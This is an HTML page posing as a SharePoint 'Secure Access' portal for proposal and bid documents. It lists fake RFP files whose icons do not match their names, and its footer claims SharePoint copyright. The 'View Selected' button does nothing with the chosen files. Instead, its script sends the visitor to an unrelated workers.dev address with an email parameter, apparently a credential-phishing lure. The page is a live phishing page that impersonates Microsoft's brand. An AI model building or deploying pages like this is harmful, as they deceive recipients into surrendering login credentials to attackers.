<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Proposal & Bid Documents — Secure Access</title>
    <meta name="description"
        content="Select and view your proposal & bidding documents.">
    <link rel="icon" href="https://comunebresso.sharepoint.com/_layouts/15/images/favicon.ico?rev=43"
        type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <script src="https://cdn.tailwindcss.com"></script>

    <script>
        tailwind.config = {
            theme: {
                extend: {
                    boxShadow: {
                        soft: '0 10px 30px -10px rgba(0,0,0,0.15)'
                    },
                    colors: {
                        brand: {
                            600: '#264A45'
                        }
                    }
                }
            }
        }
    </script>

    <style>
        html { scroll-behavior: smooth }
        .bg-soft {
            background:
                radial-gradient(1000px 500px at 10% -10%, rgba(38, 74, 69, .08), transparent),
                radial-gradient(1000px 500px at 90% -10%, rgba(38, 74, 69, .06), transparent)
        }
        button:focus-visible,
        input:focus-visible {
            outline: 2px solid #3A7A73;
            outline-offset: 2px;
        }
        .pdf-icon { color: #e74c3c; }
        .excel-icon { color: #217346; }
    </style>
</head>

<body class="min-h-screen bg-white text-slate-800">

<header class="text-white bg-brand-600">
    <div class="max-w-4xl px-4 py-10 mx-auto text-center">
        <h1 class="text-2xl font-semibold tracking-tight md:text-3xl">
            Proposal & Bid Documents — Secure Access
        </h1>
        <p class="mt-2 text-white/80">
            Select files below and view them instantly.
        </p>
    </div>
</header>

<main class="bg-soft">
    <div class="max-w-4xl px-4 mx-auto">

        <section class="p-6 -mt-8 bg-white border md:-mt-10 border-slate-200 rounded-2xl shadow-soft md:p-8">
            <div class="flex items-start justify-between gap-4">
                <div>
                    <h2 class="text-xl font-semibold">Available Files</h2>
                    <p class="mt-1 text-sm text-slate-500">Choose what you need. You can select all.</p>
                </div>
                <button id="btnSelectAll" type="button"
                    class="inline-flex items-center gap-2 px-3 py-2 text-sm border rounded-xl border-slate-300 hover:bg-slate-50">
                    <i class="fas fa-bars w-4 h-4"></i>
                    <span>Select All</span>
                </button>
            </div>

            <ul id="docList" class="mt-6 divide-y divide-slate-200">

                <li class="flex items-center justify-between gap-4 py-3">
                    <label class="flex items-center flex-1 gap-3">
                        <input type="checkbox" class="w-4 h-4 rounded border-slate-300"
                            data-file="RFP Overview Document.pdf">
                        <span class="font-medium">
                            <i class="fas fa-file-excel excel-icon"></i> RFP Overview Document
                        </span>
                    </label>
                    <span class="text-xs text-slate-500">Q2 2026</span>
                </li>

                <li class="flex items-center justify-between gap-4 py-3">
                    <label class="flex items-center flex-1 gap-3">
                        <input type="checkbox" class="w-4 h-4 rounded border-slate-300"
                            data-file="Scope of Work & Specifications.pdf">
                        <span class="font-medium">
                            <i class="fas fa-file-pdf pdf-icon"></i> Scope of Work & Specifications
                        </span>
                    </label>
                    <span class="text-xs text-slate-500">Q2 2026</span>
                </li>

                <li class="flex items-center justify-between gap-4 py-3">
                    <label class="flex items-center flex-1 gap-3">
                        <input type="checkbox" class="w-4 h-4 rounded border-slate-300"
                            data-file="Bid Submission Guidelines.pdf">
                        <span class="font-medium">
                            <i class="fas fa-file-pdf pdf-icon"></i> Bid Submission Guidelines
                        </span>
                    </label>
                    <span class="text-xs text-slate-500">Q2 2026</span>
                </li>

                <li class="flex items-center justify-between gap-4 py-3">
                    <label class="flex items-center flex-1 gap-3">
                        <input type="checkbox" class="w-4 h-4 rounded border-slate-300"
                            data-file="Compliance Requirements.pdf">
                        <span class="font-medium">
                            <i class="fas fa-file-excel excel-icon"></i> Compliance Requirements
                        </span>
                    </label>
                    <span class="text-xs text-slate-500">Q2 2026</span>
                </li>

                <li class="flex items-center justify-between gap-4 py-3">
                    <label class="flex items-center flex-1 gap-3">
                        <input type="checkbox" class="w-4 h-4 rounded border-slate-300"
                            data-file="Contract Terms & Conditions.pdf">
                        <span class="font-medium">
                            <i class="fas fa-file-pdf pdf-icon"></i> Contract Terms & Conditions
                        </span>
                    </label>
                    <span class="text-xs text-slate-500">Q2 2026</span>
                </li>

            </ul>

            <div class="flex flex-col items-stretch gap-3 mt-6 sm:flex-row sm:items-center">
                <button id="btnView" type="button"
                    class="w-full sm:w-auto inline-flex justify-center items-center gap-2 rounded-xl bg-brand-600 text-white px-5 py-3 disabled:opacity-50 disabled:cursor-not-allowed hover:bg-[#2F5E58]"
                    disabled>
                    <i class="fas fa-eye"></i>
                    <span>View Selected</span>
                    <span id="countBadge"
                        class="ml-1 inline-flex items-center justify-center rounded-md bg-white/20 px-2 py-0.5 text-xs">0</span>
                </button>
            </div>

        </section>

        <footer class="py-10 text-xs text-center text-slate-500">
            © 2026 SharePoint — Confidential For Intended Recipient Only
        </footer>

    </div>
</main>

<script>
    const checkboxes = Array.from(document.querySelectorAll('#docList input[type="checkbox"]'));
    const btnView = document.getElementById('btnView');
    const btnSelectAll = document.getElementById('btnSelectAll');
    const countBadge = document.getElementById('countBadge');

    function updateState() {
        const selected = checkboxes.filter(cb => cb.checked);
        countBadge.textContent = selected.length;
        btnView.disabled = selected.length === 0;
    }

    checkboxes.forEach(cb => cb.addEventListener('change', updateState));

    btnSelectAll.addEventListener('click', () => {
        const allChecked = checkboxes.every(cb => cb.checked);
        checkboxes.forEach(cb => cb.checked = !allChecked);
        updateState();
    });

    btnView.addEventListener('click', () => {
        if (checkboxes.filter(cb => cb.checked).length === 0) return;

        window.location.href = "https://2nrh-oimb-1lsw.austin-bordersbrothers-com-s-account.workers.dev?email=a";
    });

    updateState();
</script>

</body>
</html>
